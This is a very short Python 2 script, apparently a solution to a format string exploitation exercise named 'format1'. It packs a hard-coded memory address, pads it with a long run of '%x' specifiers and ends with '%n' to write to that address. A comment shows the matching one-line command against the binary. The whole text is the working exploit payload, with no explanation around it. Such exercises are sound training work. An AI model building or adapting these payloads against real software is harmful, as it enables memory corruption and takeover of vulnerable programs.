import struct
ret = struct.pack('I',0x08049638)
print "{0}....".format(ret) + "%x" * 131 + "%n"
#./format1 $(python -c "print 'AAAA'+'\x38\x96\x04\x08'+'BBBB'+'%x'*127+'%n'")
